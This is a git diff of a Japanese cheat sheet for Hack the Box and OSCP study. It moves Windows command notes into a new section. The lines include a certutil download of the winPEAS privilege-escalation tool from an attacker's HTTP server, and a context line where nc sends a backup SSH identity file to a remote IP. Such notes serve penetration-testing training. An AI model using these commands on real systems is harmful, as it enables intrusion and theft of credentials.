@@ -49,6 +49,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
 - [XML injection](#XMLインジェクション)
 - [LFI](#LFI)
 - [リバースエンジニアリング](#リバースエンジニアリング)
+- [Windowsコマンド](#Windowsコマンド)
 - [便利コマンド](#便利コマンド)
 
     
@@ -1264,6 +1265,59 @@ $ radare2 rev100
 
 ```
 
+# Windowsコマンド
+
+
+### Windows コマンド集
+[リンク](https://windows.command-ref.com/cmd-dir.html)
+
+
+### ファイル探索
+
+Windws:
+
+```
+search -f user.txt
+```
+
+
+### Windows server から、powershell 使わずにファイルをdownload したい
+
+[リンク: 15分20秒](https://www.youtube.com/watch?v=LN5ORLHaqXI)
+
+```
+
+exe: 欲しいファイルが winPEAS64.exe
+Linux で port 8000 で simpleHttpserver起動後
+
+certutil -urlcache -f http://ip:8000/winPEASx64.exe winPEASx64.exe
+
+-f: 特定の URL のフェッチとキャッシュの更新を強制する。
+
+```
+
+### Windows で user.txt を探したい
+
+```
+where /r . user.txt
+
+```
+
+### Windows でfileを実行したい
+
+```
+ex: filename.exe を実行
+.\filename.exe
+
+```
+
+
+### 権限を編集したい
+
+[icacls　コマンド](https://webbibouroku.com/Blog/Article/file-access-controll)
+
+
+
 
 # 便利コマンド
 
@@ -1340,16 +1394,6 @@ echo $TERM  (example response: xterm-256color)
 ```
 
 
-### ファイル探索
-
-Windws:
-
-```
-search -f user.txt
-```
-
-### Windows コマンド集
-[リンク](https://windows.command-ref.com/cmd-dir.html)
 
 
 ### root 権限か確かめる
@@ -1409,35 +1453,6 @@ nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-ident
 
 ```
 
-- Windows server から、powershell 使わずにファイルをdownload したい
-
-[リンク: 15分20秒](https://www.youtube.com/watch?v=LN5ORLHaqXI)
-
-```
-
-exe: 欲しいファイルが winPEAS64.exe
-Linux で port 8000 で simpleHttpserver起動後
-
-certutil -urlcache -f http://ip:8000/winPEASx64.exe winPEASx64.exe
-
--f: 特定の URL のフェッチとキャッシュの更新を強制する。
-
-```
-
-- Windows で user.txt を探したい
-
-```
-where /r . user.txt
-
-```
-
-- Windows でfileを実行したい
-
-```
-ex: filename.exe を実行
-.\filename.exe
-
-```
 
 - etc/passwd を書き換える
 
